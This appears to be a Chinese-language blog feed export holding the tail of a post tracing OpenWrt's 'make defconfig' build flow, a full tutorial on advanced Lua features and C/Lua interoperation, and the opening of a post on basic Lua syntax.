/home/litreily/openwrt/tmp/.build</code></pre><p><code>prepare-tmpinfo</code>, 顾名思义，就是准备一些临时信息，包括</p><ol><li>package</li><li>target/linux</li></ol><p>这两个部分，通过 <code>include/scan.mk</code> 扫描以上两个目录，将所有的 package 以及 target 信息存到临时目录 tmp 下, 然后通过对应的perl脚本 <code>scripts/$&#123;type&#125;-metadata.pl</code> 生成 <code>tmp/.config-$&#123;type&#125;.in</code> 文件。</p><ol><li><code>tmp/.packageinfo</code> : <code>tmp/.config-package.in</code></li><li><code>tmp/.targetinfo</code> : <code>tmp/config-target.in</code></li></ol><p>此外，通过<code>scripts</code>的其它脚本生成feed, package 相关的信息文件并存放于 tmp 目录。</p><p><code>prepare-tmpinfo</code> 生成过程对应的log如下：</p><pre><code class="log">Considering target file &#39;staging_dir/host/.prereq-build&#39;.  Considering target file &#39;include/prereq-build.mk&#39;.   Looking for an implicit rule for &#39;include/prereq-build.mk&#39;.   Trying pattern rule with stem &#39;prereq-build.mk&#39;.   Found an implicit rule for &#39;include/prereq-build.mk&#39;.   Finished prerequisites of target file &#39;include/prereq-build.mk&#39;.  No need to remake target &#39;include/prereq-build.mk&#39;. Finished prerequisites of target file &#39;staging_dir/host/.prereq-build&#39;. Prerequisite &#39;include/prereq-build.mk&#39; is older than target &#39;staging_dir/host/.prereq-build&#39;.No need to remake target &#39;staging_dir/host/.prereq-build&#39;.Reaping winning child 0x7fffcb0a2010 PID 16454 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 16505 Reaping winning child 0x7fffcb0a2010 PID 16505 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 16506 Collecting package info: package/base-filesCollecting package info: package/boot/arm-trusted-firmware-mvebuCollecting package info: package/boot/arm-trusted-firmware-rockchip...Collecting package info: package/utils/usbresetCollecting package info: package/utils/usbutilsCollecting package info: package/utils/util-linuxCollecting package info: merging...Collecting package info: doneReaping winning child 0x7fffcb0a2010 PID 16506 Live child 0x7fffcb0a2010 (prepare-tmpinfo) PID 18058 Collecting target info: target/linux/apm821xxCollecting target info: target/linux/arc770Collecting target info: target/linux/archs38...Collecting target info: target/linux/umlCollecting target info: target/linux/x86Collecting target info: target/linux/zynqCollecting target info: merging...Collecting target info: doneReaping winning child 0x7fffcb0a2010 PID 18058 ...</code></pre><p>以上所有搜集信息相关的log都是 scan.mk 打印的。还有值得注意的是，<code>prepare-tmpinfo</code> 首条指令</p><pre><code class="bash">make -r -s staging_dir/host/.prereq-build OPENWRT_BUILD= QUIET=0</code></pre><p>实际上在编译 <code>scripts/config/conf</code> 之前已经按照依赖规则执行过了，所以在这里会检测 <code>.prereq-build</code> 的依赖没有更新，所以不重新生成。</p><pre><code class="log">No need to remake target &#39;staging_dir/host/.prereq-build&#39;.</code></pre><p>ok, 到此为止，<code>defconfig</code> 的两个依赖项都已编译完毕。只剩下一个 <code>FORCE</code>.</p><h3 id="defconfig"><a href="#defconfig" class="headerlink" title="defconfig"></a>defconfig</h3><p><code>FORCE</code> 实际上是个伪目标，其作用是强制执行依赖它的目标指令，这里对应的是执行 <code>defconfig</code> 相关指令。</p><pre><code class="makefile">defconfig: scripts/config/conf prepare-tmpinfo FORCE    touch .config    @if [ ! -s .config -a -e $(HOME)/.openwrt/defconfig ]; then cp $(HOME)/.openwrt/defconfig .config; fi    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; $(KCONF_FLAGS) --defconfig=.config Config.in</code></pre><p>这个指令前面已经解析过了，主体部分就是 <code>scripts/config/conf --defconfig=.config Config.in</code>, 详细log如下：</p><pre><code class="log">  Successfully remade target file &#39;prepare-tmpinfo&#39;.  Pruning file &#39;FORCE&#39;. Finished prerequisites of target file &#39;defconfig&#39;.Must remake target &#39;defconfig&#39;.touch .configPutting child 0x7fffcb096b50 (defconfig) PID 20227 on the chain.Live child 0x7fffcb096b50 (defconfig) PID 20227 Reaping winning child 0x7fffcb096b50 PID 20227 Live child 0x7fffcb096b50 (defconfig) PID 20228 Reaping winning child 0x7fffcb096b50 PID 20228 [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \    scripts/config/conf  --defconfig=.config Config.inLive child 0x7fffcb096b50 (defconfig) PID 20229 ## configuration written to .config#Reaping winning child 0x7fffcb096b50 PID 20229 Removing child 0x7fffcb096b50 PID 20229 from chain.Successfully remade target file &#39;defconfig&#39;. </code></pre><p>执行不带参数的 <code>make defconfig</code> 通常只会看到以下部分的log</p><pre><code class="log">## configuration written to .config#</code></pre><p>到此，<code>make defconfig</code> 整个流程就结束了，中间会调用到很多其它 Makefile，比如 <code>scan.mk</code>, <code>verbose.mk</code> 等，这些就不细讲了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要目的是熟悉 openwrt Makefile 的执行流程，以便日后需要修改或调试某些相关问题时能够得心应手。Makefile 框架是 openwrt 非常重要的一部分，本文只是讲述了 make config 系列流程，实际上主 Makefile 有个条件分支判断 <code>OPENWRT_BUILD</code>, 当编译 kernel 或者 firmware 时，会先执行第一条分支进行初始化，然后通过 <code>toplevel.mk</code> 重新执行 make, 第二次调用时会进入第二个分支。那又将是另外一番风景，这个以后再说啦。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/openwrt/openwrt">github openwrt</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
            <tag> openwrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lua 高级特性</title>
      <link href="2020/12/25/lua-adv/"/>
      <url>2020/12/25/lua-adv/</url>
      
        <content type="html"><![CDATA[<p>这一篇来记录下 lua 的某些高级特性，以便在实际应用中得心应手。</p><h2 id="模块和包"><a href="#模块和包" class="headerlink" title="模块和包"></a>模块和包</h2><p>为了方便代码复用和扩展，可以使用 table 实现模块 module，在模块中封装通用代码。把同类型的函数放在一个文件中，然后在其它脚本中调用。</p><pre><code class="lua">module = &#123;&#125;module.version = &quot;V0.1&quot;module.author = &quot;litreily&quot;function module.func1 ()    function-bodyendfunction module.func2 ()    function-bodyendreturn module</code></pre><p>然后在其它文件通过 require 导入。</p><pre><code class="lua">require (&quot;module&quot;)-- orrequire &quot;module&quot;print(module.version)module.func1()-- orlocal m = require (&quot;module&quot;)print(m.version)m.func1()</code></pre><p>举例说明，为了复用一些通用方法比如文件读写，异常处理等功能，可以将其放在一起。</p><pre><code class="lua">-- utils functionsutils = &#123;&#125;function utils.errorhandler (err)    print(&quot;ERROR: &quot;, err)endfunction utils.xpcall (statements)    return xpcall (function () return statements end, utils.errorhandler)end-- cat filefunction utils.catfile (file)    local f = assert(io.open(file, &quot;r&quot;))    local content = f:read(&quot;*all&quot;)    f:close()    return contentend-- @mode: w a r+ w+ a+ b-- @content: stringsfunction utils.savefile (file, mode, content)    local f = assert(io.open(file, mode))    f:write(content)    f:close()endreturn utils</code></pre><p>上面对文件读写函数以及异常处理函数进行了封装，在其它文件中就可以通过 require 调用了。</p><pre><code class="lua">require &quot;utils&quot;-- cat demo.lua and write into test.txtutils.savefile(&quot;test.txt&quot;, &quot;w&quot;, utils.catfile(&quot;demo.lua&quot;))xpcall(function () print(utils.catfile(&quot;utils.lua&quot;)) end, utils.errorhandler)print(utils.xpcall(os.execute(&quot;ls /&quot;)))</code></pre><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><h3 id="function-变量"><a href="#function-变量" class="headerlink" title="function 变量"></a>function 变量</h3><p>首先要知道的是，在 Lua 中，<code>function</code> 本身就是基本的数据类型之一，也可以和普通的变量一样定义和赋值。</p><pre><code class="lua">function foo(x)    print(x)end</code></pre><p>与</p><pre><code class="lua">foo = function (x) print(x) end</code></pre><p>是等价的。因此，函数也可以当做普通变量一样被返回、被赋值。下面再来看闭包。</p><h3 id="闭包概念"><a href="#闭包概念" class="headerlink" title="闭包概念"></a>闭包概念</h3><p><strong>闭包</strong> (Closure) 的概念并不是 Lua 特有的，许多其它语言也有，比如java, js等。在 Lua 中，闭包表现为匿名函数或者函数嵌套，是由一个函数和一个非局部变量(upvalue)组成的。看个例子就清楚了。</p><pre><code class="lua">function foo(x)    local function func1()        print(x)    end    return func1endfunc = foo(&quot;hello&quot;)func()</code></pre><p>内部函数也可以不定义函数名，直接return。</p><pre><code class="lua">function foo(x)    return function ()        print(x)    endendfunc = foo(&quot;hello&quot;)func()</code></pre><p>以上的func就是创建的闭包。通过闭包函数，可以实现多个内部函数之间的资源共享。</p><pre><code class="lua">function Produce(n)   local function func1()      print(n)   end   local function func2()      n = n + 1   end   return func1, func2endf1, f2 = Produce(2020)f1() -- /* print 2020 */f2()f1() -- /* print 2021 */f2()f1() -- /* print 2022 */</code></pre><p>上面两个闭包 f1, f2 通过 n 实现资源共享。</p><h3 id="闭包应用"><a href="#闭包应用" class="headerlink" title="闭包应用"></a>闭包应用</h3><ol><li>闭包作为高阶函数的参数</li><li>回调函数</li><li>创建安全的运行环境，类似沙盒</li><li>迭代器</li></ol><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>Lua 中的迭代器就可以通过闭包实现的。以下代码就是迭代函数 <code>ipairs</code> 的实现方式。</p><pre><code class="lua">function iter (a, i)    i = i + 1    local v = a[i]    if v then       return i, v    endend function ipairs (a)    return iter, a, 0end</code></pre><p><code>ipairs</code> 的应用如下：</p><pre><code class="lua">data = &#123;&quot;hello&quot;, &quot;world&quot;, &quot;!&quot;&#125;for i, v in ipairs(data)do    print(i, v)end</code></pre><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p>Lua 是使用C语言编写的，但其不仅支持面向过程，同时也支持面向对象。而面向对象也是通过万能的 table 实现的。</p><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><pre><code class="lua">Animal = &#123;name = &quot;&quot;, height = 0, weight = 0&#125;-- The constructor functionfunction Animal:new (object, name, height, weight)    object = object or &#123;&#125;    setmetatable(object, self)    self.__index = self    self.name = name or &quot;&quot;    self.height = height or 0    self.weight = weight or 0    return objectend-- The member functionfunction Animal:printHeight()    print(&quot;the height of &quot; .. self.name .. &quot; is &quot; .. self.height)end</code></pre><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><pre><code class="lua">a = Animal:new(nil, &quot;cat&quot;, 0.2, 15)</code></pre><h3 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h3><pre><code class="lua">print(a.name)</code></pre><h3 id="访问成员函数"><a href="#访问成员函数" class="headerlink" title="访问成员函数"></a>访问成员函数</h3><pre><code class="lua">a:printHeight()</code></pre><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>在Animal类的基础上继承，派生出人类 human.</p><pre><code class="lua">Human = Animal:new(&quot;human&quot;, 0, 0)function Human:new (object, name, height, weight, sex)    object = object or Animal:new(&quot;name&quot;, height, weight)    setmetatable(object, self)    self.__index = self    self.sex = sex or &quot;male&quot;    return objectendfunction Human:printSex()    print(&quot;the sex of &quot; .. self.name .. &quot; is &quot; .. self.sex)endboy = Hunman:new(&quot;mike&quot;, 1.7, 65, &quot;male&quot;)print(boy.name)boy:printSex()</code></pre><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><h3 id="assert-and-error"><a href="#assert-and-error" class="headerlink" title="assert and error"></a>assert and error</h3><p>assert 是很多语言都会用到的处理函数，在Python、C++等大部分高级语言中都会集成。通过它可以预先判断是否会有错误产生，如果有则直接处理，而不用等待真正执行到错误处才报错。比如下面的类型检查，可以规避输入参数不合法导致的错误问题，提前退出。</p><pre><code class="lua">local function add(a,b)   assert(type(a) == &quot;number&quot;, &quot;a is not a number&quot;)   assert(type(b) == &quot;number&quot;, &quot;b is not a number&quot;)   return a+bendadd(10)</code></pre><p>执行会有错误提示</p><pre><code class="log">lua: test.lua:3: b is not a numberstack traceback:    [C]: in function &#39;assert&#39;    test.lua:3: in local &#39;add&#39;    test.lua:6: in main chunk    [C]: in ?</code></pre><p><code>error</code> 函数可以用来打印log， 而且可以指定level，控制输出包含哪些信息。</p><pre><code class="lua">error (messag [, level])</code></pre><ul><li>level=1 (default) : 输出调用error位置（文件，行号）</li><li>level=2 : 指出调用 error 的函数</li><li>level=0 : 不添加位置信息</li></ul><h3 id="pcall-and-xpcall"><a href="#pcall-and-xpcall" class="headerlink" title="pcall and xpcall"></a>pcall and xpcall</h3><p>pcall (protected call) 有点类似 Python中的 try...catch, 尝试捕获错误，不过其 <strong>接收的是一个函数，而不是表达式</strong> .</p><pre><code class="lua">if pcall(function_name, ….) then-- no errorelse-- some errorend</code></pre><p>举例如下：</p><pre><code class="lua">&gt; =pcall(function(i) print(i) end, 10)10true   &gt; =pcall(function(i) print(i) error(&#39;error message&#39;) end, 10)10false        stdin:1: error message</code></pre><p>当然第二个例子中error是人为故意添加的，倒不是说真的有错误。</p><p>理论上pcall 可以捕获函数执行过程的任意错误，但是它主要是返回错误的位置，把部分调用栈信息丢失了。此时就是 xpcall 的出场时刻了。</p><p><code>xpcall</code> 第二个参数是一个错误处理函数 errorhandler, 可以将发生错误时的栈信息打印出来。本文头部讲述模块的时候已经用到了。</p><pre><code class="lua">function foo (n)   n = n/nilendfunction errorhandler( err )   print( &quot;ERROR:&quot;, err )endstatus = xpcall(foo, errorhandler, 10)print(status)</code></pre><p>执行后输出以下错误。</p><pre><code class="log">ERROR:  stdin:1: attempt to perform arithmetic on local &#39;n&#39; (a nil value)</code></pre><h2 id="C-与-Lua-相互调用"><a href="#C-与-Lua-相互调用" class="headerlink" title="C 与 Lua 相互调用"></a>C 与 Lua 相互调用</h2><p>在C与Lua之间相互调用，需要安装有lua库，通常在编译安装时就会生成所需的头文件和库文件</p><ul><li>lua.h</li><li>lualib.h</li><li>lauxlib.h</li><li>liblua.so or liblua.a</li></ul><h3 id="C-调用-Lua-脚本"><a href="#C-调用-Lua-脚本" class="headerlink" title="C 调用 Lua 脚本"></a>C 调用 Lua 脚本</h3><p>如果单单只是要执行 Lua 脚本，非常简单。直接在C代码中通过 system 调用即可。</p><pre><code class="c">system(&quot;lua demo.lua&quot;);</code></pre><p>但是对于嵌入式设备而言，可能没有将lua编译到设备中，此时可以通过lua的库函数 <code>luaL_dofile</code> 执行脚本。</p><pre><code class="c">#include  &lt;stdio.h&gt;#include  &lt;lua.h&gt;#include  &lt;lualib.h&gt;#include  &lt;lauxlib.h&gt;int main(int argc, char *argv[])&#123;    lua_State* L;    L = luaL_newstate(); /* 创建lua状态机 */    luaL_openlibs(L); /* 打开Lua状态机中所有Lua标准库 */    luaL_dofile(L, &quot;demo.lua&quot;); /*加载lua脚本*/    lua_close(L); /*清除Lua*/    return 0;&#125;</code></pre><h3 id="C-调用-Lua-函数"><a href="#C-调用-Lua-函数" class="headerlink" title="C 调用 Lua 函数"></a>C 调用 Lua 函数</h3><p>如果要在C代码中调用Lua脚本中定义的函数，以最简单的加法为例，在lua中写一个 add 函数，然后在 C 代码中调用。</p><pre><code class="lua">-- add.luafunction add(x,y)    return x+yend</code></pre><p>在 C 代码中调用 lua 相关库函数。</p><pre><code class="c">#include  &lt;stdio.h&gt;#include  &lt;lua.h&gt;#include  &lt;lualib.h&gt;#include  &lt;lauxlib.h&gt;lua_State* L;int luaadd(int x, int y)&#123;    int sum;        lua_getglobal(L,&quot;add&quot;);/*函数名*/    lua_pushnumber(L, x); /*参数入栈*/    lua_pushnumber(L, y); /*参数入栈*/    lua_call(L, 2, 1); /*开始调用函数，有2个参数，1个返回值*/    sum = (int)lua_tonumber(L, -1); /*取出返回值*/    lua_pop(L,1); /*清除返回值的栈*/    return sum;&#125;int main(int argc, char *argv[])&#123;    int sum;    L = luaL_newstate(); /* 创建lua状态机 */    luaL_openlibs(L); /* 打开Lua状态机中所有Lua标准库 */    luaL_dofile(L, &quot;add.lua&quot;); /*加载lua脚本*/    sum = luaadd(1000, 24); /*调用C函数，这个里面会调用lua函数*/    printf(&quot;The sum is %d \n&quot;,sum);    lua_close(L); /*清除Lua*/    return 0;&#125;</code></pre><p>注意包含头文件，并确保头文件所在目录包含在环境变量 <code>$PATH</code> 中，否则编译会出错。</p><p>下面进行编译，编译的时候一定要链接好对应的库，否则同样会编译出错。</p><ul><li>liblua.a (对应安装lua时安装的 liblua.a 静态库)。</li><li>libm.so</li><li>libdl.so</li></ul><pre><code class="bash">$ gcc test.c -o test -llua -lm -ldl$ ./testThe sum is 1024</code></pre><p>如果不添加 <code>-llua</code>, 会提示以下错误。</p><pre><code class="bash">/usr/bin/ld: /tmp/ccQVKqF9.o: in function `luaadd&#39;:test.c:(.text+0x24): undefined reference to `lua_getglobal&#39;/usr/bin/ld: test.c:(.text+0x38): undefined reference to `lua_pushnumber&#39;/usr/bin/ld: test.c:(.text+0x4c): undefined reference to `lua_pushnumber&#39;/usr/bin/ld: test.c:(.text+0x70): undefined reference to `lua_callk&#39;/usr/bin/ld: test.c:(.text+0x89): undefined reference to `lua_tonumberx&#39;/usr/bin/ld: test.c:(.text+0xa4): undefined reference to `lua_settop&#39;/usr/bin/ld: /tmp/ccQVKqF9.o: in function `main&#39;:test.c:(.text+0xc1): undefined reference to `luaL_newstate&#39;/usr/bin/ld: test.c:(.text+0xd7): undefined reference to `luaL_openlibs&#39;/usr/bin/ld: test.c:(.text+0xf2): undefined reference to `luaL_loadfilex&#39;/usr/bin/ld: test.c:(.text+0x120): undefined reference to `lua_pcallk&#39;/usr/bin/ld: test.c:(.text+0x159): undefined reference to `lua_close&#39;collect2: error: ld returned 1 exit status</code></pre><p>如果不添加 <code>-lm</code>, 会提示以下错误。</p><pre><code class="bash">/usr/bin/ld: /usr/local/lib/liblua.a(lobject.o): in function `numarith.isra.0&#39;:lobject.c:(.text+0x1fb): undefined reference to `fmod&#39;/usr/bin/ld: lobject.c:(.text+0x221): undefined reference to `pow&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lvm.o): in function `luaV_execute&#39;:lvm.c:(.text+0x2145): undefined reference to `pow&#39;/usr/bin/ld: lvm.c:(.text+0x24e0): undefined reference to `fmod&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_log10&#39;:lmathlib.c:(.text+0xa3): undefined reference to `log10&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_pow&#39;:lmathlib.c:(.text+0x1b8): undefined reference to `pow&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_tanh&#39;:lmathlib.c:(.text+0x1e3): undefined reference to `tanh&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_sinh&#39;:lmathlib.c:(.text+0x213): undefined reference to `sinh&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_cosh&#39;:lmathlib.c:(.text+0x243): undefined reference to `cosh&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_tan&#39;:lmathlib.c:(.text+0x273): undefined reference to `tan&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_sqrt&#39;:lmathlib.c:(.text+0x2d6): undefined reference to `sqrt&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_sin&#39;:lmathlib.c:(.text+0x303): undefined reference to `sin&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_log&#39;:lmathlib.c:(.text+0x649): undefined reference to `log10&#39;/usr/bin/ld: lmathlib.c:(.text+0x656): undefined reference to `log&#39;/usr/bin/ld: lmathlib.c:(.text+0x678): undefined reference to `log2&#39;/usr/bin/ld: lmathlib.c:(.text+0x68c): undefined reference to `log&#39;/usr/bin/ld: lmathlib.c:(.text+0x6a0): undefined reference to `log&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_exp&#39;:lmathlib.c:(.text+0x723): undefined reference to `exp&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_cos&#39;:lmathlib.c:(.text+0x753): undefined reference to `cos&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_atan&#39;:lmathlib.c:(.text+0x7b0): undefined reference to `atan2&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_asin&#39;:lmathlib.c:(.text+0x7e3): undefined reference to `asin&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_acos&#39;:lmathlib.c:(.text+0x813): undefined reference to `acos&#39;/usr/bin/ld: /usr/local/lib/liblua.a(lmathlib.o): in function `math_fmod&#39;:lmathlib.c:(.text+0xca3): undefined reference to `fmod&#39;collect2: error: ld returned 1 exit status</code></pre><p>如果不添加 <code>-ldl</code>, 会提示以下错误。</p><pre><code class="bash">/usr/bin/ld: /usr/local/lib/liblua.a(loadlib.o): in function `lookforfunc&#39;:loadlib.c:(.text+0x565): undefined reference to `dlsym&#39;/usr/bin/ld: loadlib.c:(.text+0x5c6): undefined reference to `dlopen&#39;/usr/bin/ld: loadlib.c:(.text+0x649): undefined reference to `dlerror&#39;/usr/bin/ld: loadlib.c:(.text+0x671): undefined reference to `dlerror&#39;/usr/bin/ld: /usr/local/lib/liblua.a(loadlib.o): in function `gctm&#39;:loadlib.c:(.text+0x831): undefined reference to `dlclose&#39;collect2: error: ld returned 1 exit status</code></pre><p>所以编译时要根据错误提示添加指定的库。</p><h3 id="Lua-调用-C-函数"><a href="#Lua-调用-C-函数" class="headerlink" title="Lua 调用 C 函数"></a>Lua 调用 C 函数</h3><p>要在 Lua 中调用 C 函数，主要有以下两种方式。</p><ol><li>C 中注册函数给 Lua</li><li>C 编译出动态链接库，在 Lua 中使用 require</li></ol><p>先来看看注册函数的方式。</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;lua.h&gt;#include &lt;lualib.h&gt;#include &lt;lauxlib.h&gt;static int lua_SayHello(lua_State *L)&#123;    const char *d = luaL_checkstring(L, 1); /* 获取参数，字符串类型 */    char str[100] = &quot;hello &quot;;    strcat(str, d);    lua_pushstring(L, str); /* 返回给lua的值压栈 */    return 1; /* 返回值个数 */&#125;int main(int argc, char *argv[])&#123;    lua_State *L = luaL_newstate(); /* 创建lua状态机 */    luaL_openlibs(L);     lua_register(L, &quot;SayHello&quot;, lua_SayHello); /*注册C函数到lua */    const char* testfunc = &quot;print(SayHello(&#39;world&#39;))&quot;; /*lua中调用c函数 */    if(luaL_dostring(L, testfunc)) /* 执行Lua命令。*/        printf(&quot;Failed to invoke.\n&quot;);    lua_close(L); /*清除Lua*/    return 0;&#125;</code></pre><p>这里虽然没有看到脚本，但实际上也是用lua的语法写的指令 <code>print(SayHello(&#39;world&#39;))</code>, 然后通过 <code>luaL_dostring</code>函数执行 lua 指令。</p><blockquote><p>需要注意的是，注册的函数 <code>l_SayHello</code> return 的是返回值个数，这里1代表只有一个返回值，也就是压栈的字符串。</p></blockquote><p>接下来看另外一种，通过动态链接库的方式调用C函数。</p><pre><code class="bash">/* mylualib.c * use to compile mylualib.so */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;lua.h&gt;#include &lt;lauxlib.h&gt;#include &lt;lualib.h&gt;static int add(lua_State* L) &#123;    double op1 = luaL_checknumber(L,1);    double op2 = luaL_checknumber(L,2);    lua_pushnumber(L,op1 + op2);    return 1;&#125;static int sub(lua_State* L)&#123;    double op1 = luaL_checknumber(L,1);    double op2 = luaL_checknumber(L,2);    lua_pushnumber(L,op1 - op2);    return 1;&#125;/* 第一个字段用于Lua调用，第二个字段为C的函数指针 * 结构体数组中的最后一个元素的两个字段均为NULL，用于提示Lua注册函数已经到达数组的末尾。*/static const struct luaL_Reg mylibs[] = &#123;     &#123;&quot;add&quot;, add&#125;,    &#123;&quot;sub&quot;, sub&#125;,    &#123;NULL, NULL&#125; &#125;; /* 函数名必须为luaopen_xxx，xxx表示lib名称。Lua代码 require &quot;xxx&quot;需要与之对应。*/extern int luaopen_mylualib(lua_State* L) &#123;    luaL_newlib(L, mylibs);    return 1;&#125;</code></pre><p>以上注册了简单加法运算函数，编写后编译成动态链接库。</p><pre><code class="bash">gcc mylualib.c -shared -fPIC -o mylualib.so</code></pre><blockquote><p>这里要注意的是，编译以上动态链接库需要 <code>liblua.so</code> , 但是默认编译安装lua的时候只会生成静态库 liblua.a, 并不会生成这个文件，所以需要修改lua的 Makefile，添加 liblua.so 相关配置，最后重新编译安装lua。</p></blockquote><p>然后写个简单的lua脚本 <code>my.lua</code>.</p><pre><code class="lua">-- my.lualocal mylib = require &quot;mylualib&quot;print(mylib.add(12,33))print(mylib.sub(33,22))</code></pre><p>执行下看看效果。</p><pre><code class="bash">$ lua my.lua45.011.0</code></pre><p>完美执行。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>最后来看个Lua的示例程序。</p><h3 id="getopt"><a href="#getopt" class="headerlink" title="getopt"></a>getopt</h3><p>Lua 没有官方的getopt库，但是 GitHub 上有很多库用于替代它的自定义库。比如下面这个，是相对更符合shell习惯的。</p><pre><code class="lua">--- /*@from: https://github.com/skeeto/getopt-lua--- getopt(3)-like functionality for Lua 5.1 and later-- This is free and unencumbered software released into the public domain.--- getopt(argv, optstring [, nonoptions])---- Returns a closure suitable for &quot;for ... in&quot; loops. On each call the-- closure returns the next (option, optarg). For unknown options, it-- returns (&#39;?&#39;, option). When a required optarg is missing, it returns-- (&#39;:&#39;, option). It is reasonable to continue parsing after errors.-- Returns nil when done.---- The optstring follows the same format as POSIX getopt(3). However,-- this function will never print output on its own.---- Non-option arguments are accumulated, in order, in the optional-- &quot;nonoptions&quot; table. If a &quot;--&quot; argument is encountered, appends the-- remaining arguments to the nonoptions table and returns nil.---- The input argv table is left unmodified.*/local function getopt(argv, optstring, nonoptions)    local optind = 1    local optpos = 2    nonoptions = nonoptions or &#123;&#125;    return function()        while true do            local arg = argv[optind]            if arg == nil then                return nil            elseif arg == &#39;--&#39; then                for i = optind + 1, #argv do                    table.insert(nonoptions, argv[i])                end                return nil            elseif arg:sub(1, 1) == &#39;-&#39; then                local opt = arg:sub(optpos, optpos)                local start, stop = optstring:find(opt .. &#39;:?&#39;)                if not start then                    optind = optind + 1                    optpos = 2                    return &#39;?&#39;, opt                elseif stop &gt; start and #arg &gt; optpos then                    local optarg = arg:sub(optpos + 1)                    optind = optind + 1                    optpos = 2                    return opt, optarg                elseif stop &gt; start then                    local optarg = argv[optind + 1]                    optind = optind + 2                    optpos = 2                    if optarg == nil then                        return &#39;:&#39;, opt                    end                    return opt, optarg                else                    optpos = optpos + 1                    if optpos &gt; #arg then                        optind = optind + 1                        optpos = 2                    end                    return opt, nil                end            else                optind = optind + 1                table.insert(nonoptions, arg)            end        end    endendreturn getopt--[[ /*Examples:getopt = require(&#39;getopt&#39;)local append = falselocal binary = falselocal color = &#39;white&#39;local nonoptions = &#123;&#125;local infile = io.input()for opt, arg in getopt(arg, &#39;abc:h&#39;, nonoptions) do    if opt == &#39;a&#39; then        append = true    elseif opt == &#39;b&#39; then        binary = true    elseif opt == &#39;c&#39; then        color = arg    elseif opt == &#39;h&#39; then        usage()        os.exit(0)    elseif opt == &#39;?&#39; then        print(&#39;error: unknown option: &#39; .. arg)        os.exit(1)    elseif opt == &#39;:&#39; then        print(&#39;error: missing argument: &#39; .. arg)        os.exit(1)    endendif #nonoptions == 1 then    infile = io.open(nonoptions[1], &#39;r&#39;)elseif #nonoptions &gt; 1 then    print(&#39;error: wrong number of arguments: &#39; .. #nonoptions)    os.exit(1)end*/]]</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/maximuszhou/article/details/44280109">深入理解Lua的闭包一：概念、应用和实现原理</a></li><li><a href="https://www.runoob.com/lua/lua-iterators.html">Lua 迭代器</a></li><li><a href="https://www.runoob.com/lua/lua-error-handling.html">Lua 错误处理</a></li><li><a href="https://www.jb51.net/article/132851.htm">C语言与Lua之间的相互调用详解</a></li><li><a href="https://www.cnblogs.com/sifenkesi/p/3876745.html">Lua中调用C函数</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Lua </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lua </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lua 基本语法</title>
      <link href="2020/12/24/lua-basic/"/>
      <url>2020/12/24/lua-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><pre><code class="lua">-- single line comment--[[    mutil line comments]]</code></pre><span id="more"></span><h3 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h3><p>变量名避免与以下关键词重复。</p><table><thead><tr><th>and</th><th>break</th><th>do</th><th>else</th><th>elseif</th><th>end</th><th>false</th><th>for</th></tr></thead><tbody><tr><td>function</td><td>if</td><td>in</td><td>local</td><td>nil</td><td>not</td><td>or</td><td>repeat</td></tr><tr><td>return</td><td>then</td><td>true</td><td>until</td><td>while</td><td>goto</td><td></td><td></td></tr></tbody></table><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>默认情况下，变量总是 <strong>全局变量</strong> , 局部变量需要使用 <code>local</code> 标记。</p><pre><code class="lua">a = 1               -- global valuelocal b = 2         -- local valuefunction test()    c = 3           -- global value    local d = 4     -- local valueend</code></pre><blockquote><p>Lua 的变量与 Python 